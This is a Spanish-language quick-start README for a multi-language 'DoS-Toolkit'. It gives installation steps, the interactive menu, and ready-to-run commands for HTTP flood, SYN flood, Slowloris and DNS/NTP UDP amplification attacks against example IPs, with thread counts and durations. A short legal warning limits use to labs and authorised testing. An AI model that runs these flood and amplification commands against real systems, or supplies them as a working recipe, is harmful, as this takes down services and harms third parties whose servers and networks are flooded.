# 🚀 COMIENZA AQUÍ - DoS-Toolkit v1.0.0

## ⚡ 3 Pasos para Empezar

### Paso 1: Instalar Dependencias (30 segundos)

```bash
pip install -r python/requirements.txt
```

### Paso 2: Verificar Instalación (1 minuto)

```bash
python test_toolkit.py
```

**Resultado esperado:**
```
✓ ¡Todas las pruebas pasaron!
El toolkit está listo para usar.
```

### Paso 3: Ejecutar CLI (Inmediato)

```bash
python cli.py
```

---

## 📊 Menú Principal

```
╔════════════════════════════════════════════════════════════════╗
║                    DoS-TOOLKIT v1.0                           ║
║              Multi-Language Denial of Service                 ║
║                                                                ║
║  Python | Go | Rust | C/C++                                   ║
╚════════════════════════════════════════════════════════════════╝

[*] Selecciona el lenguaje de ejecución:

    1. Python
    2. Go
    3. Rust
    4. C/C++
    0. Salir

    [?] Selecciona una opción: 1
```

---

## 🎯 Primer Ataque (Opción A: CLI Interactivo)

```
[*] Ataques disponibles en Python:

    1. HTTP-Flood
    2. SYN-Flood
    3. Slowloris
    4. UDP-Amplification
    5. Proxy-Utils
    0. Volver

    [?] Selecciona un ataque: 1

[*] Configurando HTTP-Flood...

    [?] IP/Dominio objetivo: localhost
    [?] Puerto (default 80): 8000
    [?] Número de threads (default 100): 5
    [?] Duración en segundos (default 60): 10

[!] ADVERTENCIA: Vas a ejecutar HTTP-Flood contra localhost:8000
    ¿Continuar? (s/n): s
```

---

## 🎯 Primer Ataque (Opción B: Línea de Comandos)

### Crear servidor de prueba (Terminal 1)
```bash
python -m http.server 8000
```

### Ejecutar ataque (Terminal 2)
```bash
python python/attacks.py --attack http_flood --target localhost --port 8000 --threads 5 --duration 10
```

---

## 📚 Documentación

| Documento | Propósito | Tiempo |
|-----------|-----------|--------|
| [QUICKSTART.md](QUICKSTART.md) | Inicio rápido | 5 min |
| [EJEMPLOS.md](EJEMPLOS.md) | Ejemplos detallados | 15 min |
| [README.md](README.md) | Documentación completa | 30 min |
| [SETUP.md](SETUP.md) | Guía de instalación | 20 min |
| [LICENSE.md](LICENSE.md) | Licencia y términos | 10 min |
| [INDEX.md](INDEX.md) | Índice de navegación | 5 min |

---

## 🔧 Tipos de Ataques

### 1. HTTP-Flood
```bash
python python/attacks.py --attack http_flood --target 192.168.1.1 --port 80 --threads 50 --duration 60
```
**Uso**: Abrumar servidor web con solicitudes HTTP

### 2. SYN-Flood
```bash
sudo python python/attacks.py --attack syn_flood --target 192.168.1.1 --port 443 --threads 100 --duration 60
```
**Uso**: Abrumar tabla de conexiones TCP (requiere admin)

### 3. Slowloris
```bash
python python/attacks.py --attack slowloris --target 192.168.1.1 --port 80 --threads 30 --duration 300
```
**Uso**: Mantener conexiones abiertas indefinidamente

### 4. UDP-Amplification
```bash
python python/attacks.py --attack udp_amplification --target 192.168.1.1 --port 53 --threads 200 --duration 60
```
**Uso**: Amplificar tráfico usando servidores DNS/NTP

---

## ⚠️ Importante

### ✅ Permitido
- Pruebas en tu propia red
- Laboratorios de seguridad
- Investigación académica
- Pruebas autorizadas

### ❌ Prohibido
- Ataques no autorizados
- Daño a sistemas ajenos
- Uso malicioso

### 🔐 Advertencia Legal
El uso no autorizado es **ILEGAL** y puede resultar en:
- Cargos criminales
- Multas de hasta $250,000 USD
- Encarcelamiento de hasta 10 años

**Consulta [LICENSE.md](LICENSE.md) para términos completos.**

---

## 🆘 Solución Rápida de Problemas

### "python: command not found"
```bash
python3 cli.py
```

### "ModuleNotFoundError: No module named 'requests'"
```bash
pip install -r python/requirements.txt
```

### "Permission denied" (Linux/macOS)
```bash
chmod +x cli.py
python cli.py
```

### "SYN-Flood requiere permisos de administrador"
```bash
sudo python python/attacks.py --attack syn_flood ...
```

---

## 📋 Checklist de Inicio

- [ ] Instalar dependencias: `pip install -r python/requirements.txt`
- [ ] Verificar: `python test_toolkit.py`
- [ ] Ejecutar: `python cli.py`
- [ ] Leer: [QUICKSTART.md](QUICKSTART.md)
- [ ] Leer: [LICENSE.md](LICENSE.md)
- [ ] Entender restricciones legales
- [ ] Usar responsablemente

---

## 🎓 Próximos Pasos

1. **Leer documentación**: [QUICKSTART.md](QUICKSTART.md)
2. **Ver ejemplos**: [EJEMPLOS.md](EJEMPLOS.md)
3. **Entender legalidad**: [LICENSE.md](LICENSE.md)
4. **Experimentar**: Crear ataques personalizados
5. **Contribuir**: Mejorar el proyecto

---

## 📊 Estadísticas

- **Líneas de código**: ~2000+
- **Documentación**: ~3000+ líneas
- **Tipos de ataques**: 5
- **Lenguajes**: 4
- **Módulos**: 5+
- **Versión**: 1.0.0
- **Estado**: Estable

---

## 🎯 Características

✅ CLI centralizado en español
✅ 5 tipos de ataques
✅ 4 lenguajes de programación
✅ Módulos core reutilizables
✅ Documentación completa
✅ Suite de pruebas
✅ Configuración global
✅ Manejo de errores robusto

---

## 🚀 ¡Listo!

Ahora puedes ejecutar:

```bash
python cli.py
```

**¡Disfruta del DoS-Toolkit!**

---

## 📞 Soporte

- **Documentación**: [INDEX.md](INDEX.md)
- **Ejemplos**: [EJEMPLOS.md](EJEMPLOS.md)
- **Instalación**: [SETUP.md](SETUP.md)
- **Problemas**: [SETUP.md](SETUP.md) - Solución de Problemas

---

**Versión**: 1.0.0
**Estado**: Estable y Funcional
**Fecha**: 2024-01-15

---

## 🎉 ¡Bienvenido!

Gracias por usar DoS-Toolkit.

**Úsalo responsablemente.**
